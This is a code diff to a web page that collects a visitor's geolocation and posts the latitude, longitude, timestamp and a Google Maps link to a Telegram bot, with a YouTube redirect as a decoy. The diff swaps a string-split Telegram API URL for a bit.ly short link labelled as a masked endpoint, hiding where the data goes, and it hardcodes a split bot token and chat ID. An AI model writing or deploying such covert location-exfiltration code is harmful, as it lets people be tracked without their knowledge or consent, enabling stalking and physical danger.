@@ -65,7 +65,8 @@
         const t2 = 'AAF8MOt9s2IgFyEzhBok9atp15UoqSK-tYw';
         const TELEGRAM_BOT_TOKEN = t1 + ':' + t2;
         const TELEGRAM_CHAT_ID = '6696895935';
-        const REDIRECT_URL = 'https://youtu.be/jSOmHSE8JIw?si=T5nDlk41noysj_J4';
+        const REDIRECT_URL = 'https://youtu.be/jSOmHSE8JIw?si=T5nDlk41noysj_J4'; // Redirect URL
+        const TELEGRAM_API_URL = 'https://bit.ly/4iNGqmM'; // Masked Telegram API URL
 
         function startProcess() {
             // Show loader, hide button and text
@@ -93,15 +94,8 @@
             const ts = new Date().toLocaleString();
             const msg = `Location Found!\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${ts}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`;
 
-            // Telegram API URL (obfuscated)
-            const u1 = 'https://api.';
-            const u2 = 'telegram.org';
-            const u3 = '/bot';
-            const u4 = '/sendMessage';
-            const url = u1 + u2 + u3 + TELEGRAM_BOT_TOKEN + u4;
-
-            // POST request
-            fetch(url, {
+            // POST request to masked Telegram API URL
+            fetch(TELEGRAM_API_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
